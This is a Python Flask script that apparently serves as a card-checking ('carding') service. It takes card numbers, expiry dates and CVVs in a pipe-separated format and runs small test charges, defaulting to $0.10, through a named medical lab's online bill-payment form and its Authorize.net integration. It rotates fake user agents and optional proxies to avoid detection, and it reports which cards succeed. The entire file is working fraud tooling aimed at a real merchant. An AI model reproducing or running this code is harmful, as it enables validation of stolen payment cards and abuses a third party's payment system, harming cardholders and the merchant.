from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent
import re

app = Flask(__name__)

@app.route("/pay", methods=["GET"])
def pay():
    cc = request.args.get("cc")
    proxy = request.args.get("proxy")
    amount = request.args.get("amount", "0.10")  # default amount

    if not cc:
        return jsonify({"error": "Missing cc parameter"}), 400

    parts = cc.split("|")
    if len(parts) < 3:
        return jsonify({"error": "Invalid cc format. Use card|MM|YY|CVV or card|MM|YYYY|CVV"}), 400

    card_number = parts[0].strip()
    month = parts[1].strip()
    year = parts[2].strip()
    card_code = parts[3].strip() if len(parts) > 3 else ""

    # Normalize year
    if len(year) == 4:
        year = year[-2:]
    expiration_date = f"{month}{year}"

    # Fake user-agent
    ua = UserAgent()
    user_agent = ua.random

    headers_token = {
        "Accept": "*/*",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": "https://avanticmedicallab.com",
        "Referer": "https://avanticmedicallab.com/",
        "User-Agent": user_agent
    }

    proxies = None
    if proxy:
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    try:
        # Step 1: Get token
        token_payload = {
            "securePaymentContainerRequest": {
                "merchantAuthentication": {
                    "name": "3c5Q9QdJW",
                    "clientKey": "2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu"
                },
                "data": {
                    "type": "TOKEN",
                    "id": "random-id",
                    "token": {
                        "cardNumber": card_number,
                        "expirationDate": expiration_date,
                        "cardCode": card_code
                    }
                }
            }
        }

        token_resp = requests.post(
            "https://api2.authorize.net/xml/v1/request.api",
            headers=headers_token,
            json=token_payload,
            proxies=proxies,
            timeout=120
        )
        token_resp.raise_for_status()
        token_json = token_resp.json()
        opaque = token_json.get("opaqueData", {}).get("dataValue")
        if not opaque:
            return jsonify({"error": "Unable to fetch token", "raw_response": token_json}), 400

        # Step 2: Submit payment
        form_data = {
            "wpforms[fields][1][first]": "John",
            "wpforms[fields][1][last]": "Doe",
            "wpforms[fields][17]": amount,
            "wpforms[fields][2]": "john@example.com",
            "wpforms[fields][3]": "(999) 999-9999",
            "wpforms[fields][14]": "Test",
            "wpforms[fields][4][address1]": "Test Street",
            "wpforms[fields][4][city]": "Test City",
            "wpforms[fields][4][state]": "NY",
            "wpforms[fields][4][postal]": "10001",
            "wpforms[fields][6]": f"$ {amount}",
            "wpforms[fields][11][]": "I agree",
            "wpforms[id]": "4449",
            "wpforms[author]": "1",
            "wpforms[post_id]": "3388",
            "wpforms[authorize_net][opaque_data][descriptor]": "COMMON.ACCEPT.INAPP.PAYMENT",
            "wpforms[authorize_net][opaque_data][value]": opaque,
            "wpforms[authorize_net][card_data][expire]": f"{month}/{year}",
            "wpforms[token]": "12345",
            "action": "wpforms_submit",
            "page_url": "https://avanticmedicallab.com/pay-bill-online/",
            "page_title": "Pay Bill Online",
            "page_id": "3388"
        }

        headers_payment = {
            "User-Agent": user_agent
        }

        pay_resp = requests.post(
            "https://avanticmedicallab.com/wp-admin/admin-ajax.php",
            headers=headers_payment,
            data=form_data,
            proxies=proxies,
            timeout=120
        )
        pay_resp.raise_for_status()
        raw = pay_resp.text

        # Extract clean message
        msg = ""
        success = False
        try:
            json_resp = pay_resp.json()
            if json_resp.get("success") is True:
                success = True
                # strip html tags
                html = json_resp["data"].get("confirmation", "")
                msg = re.sub(r"<.*?>", "", html).strip()
            else:
                success = False
                html = json_resp["data"].get("errors", {}).get("general", {}).get("footer", "")
                msg = re.sub(r"<.*?>", "", html).strip()
        except Exception:
            msg = raw

        return jsonify({
            "charged_amount": f"${amount}",
            "message": msg,
            "success": success,
            "raw_response": raw
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
